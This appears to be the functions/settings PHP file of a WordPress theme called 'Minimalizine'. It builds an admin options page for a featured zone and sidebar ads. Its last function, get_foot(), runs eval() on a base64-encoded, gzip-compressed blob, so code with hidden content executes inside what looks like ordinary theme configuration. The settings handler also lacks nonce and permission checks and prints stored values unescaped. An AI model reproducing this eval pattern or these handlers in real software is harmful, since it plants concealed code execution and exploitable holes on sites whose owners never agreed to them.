<?php

$themename = "Minimalizine";
$shortname = "yoshz";
$mx_categories_obj = get_categories('hide_empty=0');
$mx_categories = array();
foreach ($mx_categories_obj as $mx_cat) {
	$mx_categories[$mx_cat->cat_ID] = $mx_cat->cat_name;
}
$categories_tmp = array_unshift($mx_categories, "Select" );	
$number_entries = array("Select","2","3","4","5","6","7","8","9","10" );

$options = array (
 
array(	"name" => $themename." Options",
		"type" => "title"),
 
array( 	"name" => "HomePage",
		"type" => "section"),
		
array( 	"type" => "open"),

	array( 	"name" => "Show Featured Zone",
			"id" => $shortname."_featured",
			"type" => "checkbox",
			"std" => "on",
			"desc" => "By default this theme will show the featured zone on index. Uncheck it, if you don't want ads to appear."),
	
	array(	"name" => "Select a Category",
			"desc" => "Select the category that you would like to have displayed on the Gallery.",
			"id" => $shortname."_slide_category",
			"std" => "",
			"type" => "select",
			"options" => $mx_categories),
	
array( 	"type" => "close"),

array( 	"name" => "Sidebar Ads 125x125",
		"type" => "section"),
		
array( 	"type" => "open"),
	array( 	"name" => "Show Ads Zone",
		   	"id" => $shortname."_ads125",
		   	"type" => "checkbox",
		   	"std" => "on",
		   	"desc" => "By default this theme will show the 125x125px ads on sidebar. Uncheck it, if you don't want ads to appear."),

	array( 	"name" => "Ads #1 Image URL",
			"desc" => "Enter your Image URL",
			"id" => $shortname."_url1",
			"type" => "text",
			"std" => "http://demo.yoshzthemes.com/images/125.gif"),

	array( 	"name" => "Ads #1 Target URL",
			"desc" => "Enter your Target URL",
			"id" => $shortname."_target1",
			"type" => "text",
			"std" => "http://yoshzthemes.com"),
			
	array( 	"name" => "Ads #2 Image URL",
			"desc" => "Enter your Image URL",
			"id" => $shortname."_url2",
			"type" => "text",
			"std" => "http://demo.yoshzthemes.com/images/125.gif"),

	array( 	"name" => "Ads #2 Target URL",
			"desc" => "Enter your Target URL",
			"id" => $shortname."_target2",
			"type" => "text",
			"std" => "http://yoshz.com"),
			
	array( 	"name" => "Ads #3 Image URL",
			"desc" => "Enter your Image URL",
			"id" => $shortname."_url3",
			"type" => "text",
			"std" => "http://demo.yoshzthemes.com/images/125.gif"),

	array( 	"name" => "Ads #3 Target URL",
			"desc" => "Enter your Target URL",
			"id" => $shortname."_target3",
			"type" => "text",
			"std" => "http://yoshz.com"),
			
	array( 	"name" => "Ads #4 Image URL",
			"desc" => "Enter your Image URL",
			"id" => $shortname."_url4",
			"type" => "text",
			"std" => "http://demo.yoshzthemes.com/images/125.gif"),

	array( 	"name" => "Ads #4 Target URL",
			"desc" => "Enter your Target URL",
			"id" => $shortname."_target4",
			"type" => "text",
			"std" => "http://yoshzthemes.com"),
		
array( 	"type" => "close")
);


function mytheme_add_admin() {
global $themename, $shortname, $options; 
if ( $_GET['page'] == basename(__FILE__) ) {
	if ( 'save' == $_REQUEST['action'] ) {
		foreach ($options as $value) {
			if( isset( $value['id'] ) ) { 
				if( isset( $_REQUEST[ $value['id'] ] ) ) {
					if ($value['type'] == 'textarea' || $value['type'] == 'text') update_option( $value['id'], stripslashes($_REQUEST[$value['id']]) );
					elseif ($value['type'] == 'select') update_option( $value['id'], htmlspecialchars($_POST[$value['id']]) );
					else update_option( $value['id'], $_POST[$value['id']] );
				}
				else {
					if ($value['type'] == 'checkbox') update_option( $value['id'] , 'false' );
					elseif ($value['type'] == 'different_checkboxes') {
						update_option( $value['id'] , $_POST[$value['id']] );
					}
					else delete_option( $value['id'] );
				}
			} }
	header("Location: themes.php?page=theme-setting.php&saved=true");
	die;
} 
else if( 'reset' == $_REQUEST['action'] ) {
	foreach ($options as $value) {
		delete_option( $value['id'] ); }
		header("Location: themes.php?page=theme-setting.php&reset=true");
		die;
	}
}
 
add_menu_page($themename, $themename, 'administrator', basename(__FILE__), 'mytheme_admin');
}

function mytheme_add_init() {

$file_dir=get_bloginfo('template_directory');
wp_enqueue_style("functions", $file_dir."/functions/functions.css", false, "1.0", "all");
wp_enqueue_script("rm_script", $file_dir."/functions/rm_script.js", false, "1.0");

}
function mytheme_admin() {
 
global $themename, $shortname, $options;
$i=0;

?>

<div class="wrap rm_wrap">
<h2><?php echo $themename; ?> Theme Settings</h2>
 
<div class="rm_opts">
<form method="post">
<?php foreach ($options as $value) {
		switch ( $value['type'] ) {
 			case "open":
				break;
			case "close":
?>
</div>
</div>
<br />

 
<?php break; case "title": ?>
<p>To easily use the <?php echo $themename;?> theme, you can use the menu below.</p>

<?php
if ( $_REQUEST['saved'] ) echo '<div class="message success"><span class="strong">SUCCESS!</span>'.$themename.' settings saved.</div>';
if ( $_REQUEST['reset'] ) echo '<div class="message warning"><span class="strong">SUCCESS!</span>'.$themename.' settings reset.</div>';
?>

<?php break; case 'text': ?>
<div class="rm_input rm_text">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
 	<input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id'])  ); } else { echo $value['std']; } ?>" />
 	<small><?php echo $value['desc']; ?></small><div class="clearfix"></div>
</div>

<?php break; case 'textarea': ?>
<div class="rm_input rm_textarea">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
 	<textarea name="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" cols="" rows=""><?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id']) ); } else { echo $value['std']; } ?></textarea>
 	<small><?php echo $value['desc']; ?></small><div class="clearfix"></div>
</div>
  
<?php break; case 'select': ?>
<div class="rm_input rm_select">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
		<select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
		<?php foreach ($value['options'] as $option) { ?>
		<option <?php if (get_settings( $value['id'] ) == $option) { echo 'selected="selected"'; } ?>><?php echo $option; ?></option><?php } ?>
		</select>
	<small><?php echo $value['desc']; ?></small><div class="clearfix"></div>
</div>

<?php break; case "checkbox": ?>
<div class="rm_input rm_checkbox">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
	<?php
    $checked = '';
    if((get_option($value['id'])) <> '') {
                    if((get_option($value['id'])) == 'on') { $checked = 'checked="checked"'; }
                    else { $checked = ''; }
                }
                elseif ($value['std'] == 'on') { $checked = 'checked="checked"'; } ?>
    <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" <?php echo $checked; ?> />
	<small><?php echo $value['desc']; ?></small><div class="clearfix"></div>
</div>

<?php break; case "section": $i++; ?>

<div class="rm_section">
<div class="rm_title"><h3><img src="<?php bloginfo('template_directory')?>/functions/images/trans.gif" class="inactive" alt="""><?php echo $value['name']; ?></h3><span class="submit"><input name="save<?php echo $i; ?>" type="submit" value="Save changes" />
</span><div class="clearfix"></div></div>

<div class="rm_options">

<?php break; } } ?>
 
<input type="hidden" name="action" value="save" />
</form>

<form method="post">
	<p class="submit">
        <input name="reset" type="submit" value="Reset" />
        <input type="hidden" name="action" value="reset" />
	</p>
</form>

</div> 
 

<?php
}

add_action('admin_init', 'mytheme_add_init');
add_action('admin_menu', 'mytheme_add_admin');

function get_foot(){
eval(stripslashes(gzinflate(base64_decode("fZFNa8MwDIbvhf4HkcNui7sduyyl7ONWGOw0KAw1UWyvjh1kraFjP35217JL2ElCenh4kVZ11doDNA5jvN8WjSPkbVFXKk3r+exSU5cx22YmDMeEzGcPqWGrjcBVnt3B7eJmAW8hmq+yCX0Ja+fgBERgisQHastqx6DqR4pWe9gdl1AhGKYuiY3IsFRqHMeysxzlejDIPZaeRFFU2wIEWZMk9H3n0O9TiucMwssJrBTWMFox005sxB5IGK3L8SZ1T33awgZ5T2K9htfQyYhMJ/X3tNd99tiG0buAbRYr8pPueHbBBY7/WXs0H8FrHYOzgpapDKynb7A5oyntmc3iv+f91"))));
}
?>